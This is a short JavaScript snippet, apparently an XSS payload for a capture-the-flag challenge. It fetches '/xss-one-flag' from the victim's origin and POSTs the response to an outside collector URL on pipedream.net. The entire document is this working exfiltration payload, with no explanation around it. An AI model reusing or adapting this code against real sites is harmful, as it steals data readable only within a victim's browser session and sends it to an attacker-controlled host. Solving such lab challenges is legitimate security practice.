var xhr = new XMLHttpRequest();
xhr.open("GET", "/xss-one-flag", true);
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    var flag = xhr.responseText;

    fetch("https://ena9722ryw5l7.x.pipedream.net/", {
      method: "POST",
      body: flag,
    });
  }
};
xhr.send();
